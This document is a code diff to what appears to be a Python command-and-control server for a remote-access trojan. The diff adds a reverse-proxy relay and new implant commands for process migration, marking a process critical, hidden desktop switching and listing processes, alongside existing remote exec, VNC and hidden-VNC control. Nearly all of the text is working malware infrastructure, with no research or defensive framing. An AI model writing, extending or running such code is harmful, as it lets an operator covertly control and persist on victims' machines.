@@ -1,5 +1,6 @@
 import socket, time
 import zlib, re, os, json, binascii
+import multiprocessing
 from time import gmtime, strftime
 import base64, shlex, random, killthread, threading
 from tools import *
@@ -21,12 +22,13 @@ SOCKS_PORT = 6968
 TEAMSERV_PORT = 6942
 VNC_PORT = 1235
 HVNC_PORT = 1236
+INT_PROX_PORT = 42069
+EXT_PROX_PORT = 42068
 
 opcodes = """
     PRINT, //1//print [text]
     MSGBOX, //2//msgbox [title] [content]
     POPINT, //0
-    POPSTR, //0
     CONSUME, //0
     EXEC, //r1//exec [command]
     EXIT, //0
@@ -42,6 +44,18 @@ opcodes = """
     UNHOOK, //0//auto remove hooks
     VNC, //2//vnc [ip] [port]
     HVNC, //2//hvnc [ip] [port]
+    CRITICAL, //1//critical [true/false]
+    ENUMDESKTOPS, //0
+    SETWINSTA, //1//setwinsta [station]
+    SETTHDDSK, //1//setthddsk [desktop]
+    GETTHDDSK, //0
+    PUSHINT, //0
+    PUSHSTR, //0
+    PROXY, //2//proxy [ip] [port]
+    KILLPROXY, //1//killproxy [id]
+    MIGRATE, //1//migrate [pid]
+    PS, //0//list processes
+    CURRENTPID, //0
 """
 c2s = """
     SOCKS,
@@ -242,6 +256,43 @@ def livers():
         time.sleep(0.1)
 
 
+def pipe(fr, to):
+    while True:
+        try:
+            dat = fr.recv(4096)
+            if not dat:
+                break
+            to.sendall(dat)
+        except:
+            fr.close()
+            break
+proxied = False
+def proxylord():
+    global INT_PROX_PORT, EXT_PROX_PORT, proxied
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0", EXT_PROX_PORT)) #transmission
+    s.listen()
+    while True:
+        proxied = False
+        conn, addr = s.accept()
+        proxied = True
+        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s2.bind(("127.0.0.1", INT_PROX_PORT))
+        s2.listen()
+        while True:
+            cli, _ = s2.accept()
+            cli.settimeout(2)
+            proc = multiprocessing.Process(target=pipe, args=(conn, cli,))
+            proc.start()
+            pipe(cli, conn)
+            proc.terminate()
+            try:
+                conn.sendall(b"CLOSED")
+            except:
+                break
+
 data = toCmdTable(opcodes)
 c2table = toTable(c2s)
 def socksender(conn, ref, uid):
@@ -304,7 +355,7 @@ def allo():
     return allout.strip()+"\n"
 @app2.route("/clients" , methods=['GET'])
 def alive():
-    global living, vncs, hvncs
+    global living, vncs, hvncs, proxied
     a = []
     for x in living:
         a.append(x+" ("+living[x][0]+")")
@@ -312,6 +363,8 @@ def alive():
         a.append('<a target="_blank" href="/vnc/'+x+'">VNC '+x+'</a>')
     for x in hvncs:
         a.append('<a target="_blank" href="/hvnc/'+x+'">HVNC '+x+'</a>')
+    if proxied:
+        a.append("Proxy online")
     return json.dumps(a)
 @app2.route("/" , methods=['GET'])
 def index():
@@ -355,4 +408,5 @@ killthread.Thread(target=sockserv).start()
 killthread.Thread(target=httpserv).start()
 killthread.Thread(target=vncth).start()
 killthread.Thread(target=hvncth).start()
+killthread.Thread(target=proxylord).start()
 serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)
